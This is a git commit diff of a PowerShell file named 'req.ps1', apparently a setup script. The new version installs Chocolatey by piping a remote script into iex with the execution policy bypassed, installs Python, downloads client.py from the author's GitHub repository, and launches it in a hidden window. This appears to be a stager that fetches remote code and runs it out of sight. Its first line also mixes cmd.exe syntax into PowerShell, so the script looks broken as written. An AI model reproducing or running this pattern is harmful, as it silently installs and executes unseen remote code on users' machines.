15003b0896e4f0c76cb22a27f0760c0a69e13bd3
ArcticHonour <122731187+ArcticHonour@users.noreply.github.com>
2025-07-15 20:31:21 +0100

    Update req.ps1

--- req.ps1
+++ req.ps1
@@ -1,39 +1,13 @@
-# Define Python installer URL and temp path
-$pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
-$tempInstallerPath = "$env:TEMP\python-installer.exe"
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"
 
-# Download Python installer
-Write-Host "Downloading Python installer..."
-Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $tempInstallerPath
+choco install -y python3
 
-# Install Python silently for all users with PATH added
-Write-Host "Installing Python..."
-Start-Process -FilePath $tempInstallerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+python --version
 
-# Remove installer
-Remove-Item $tempInstallerPath
+mkdir SWAMI
 
-# Verify python installation
-Write-Host "Verifying Python installation..."
-$pythonPath = Get-Command python -ErrorAction SilentlyContinue
+cd SWAMI
 
-if (-not $pythonPath) {
-    Write-Host "Python installation failed or Python is not in PATH."
-    exit 1
-}
+iwr "https://raw.githubusercontent.com/ArcticHonour/client/refs/heads/main/client.py" -UseBasicParsing -OutFile client.py
 
-Write-Host "Python installed successfully."
-
-# Download the python script content
-$scriptUrl = "https://raw.githubusercontent.com/ArcticHonour/client/refs/heads/main/client.py"
-$tempScriptPath = "$env:TEMP\client.py"
-
-Write-Host "Downloading Python script..."
-Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScriptPath
-
-# Run the downloaded Python script
-Write-Host "Running Python script..."
-python $tempScriptPath
-
-# Optionally remove the script after running
-Remove-Item $tempScriptPath
+Start-Process python.exe -ArgumentList "client.py" -WindowStyle Hidden 
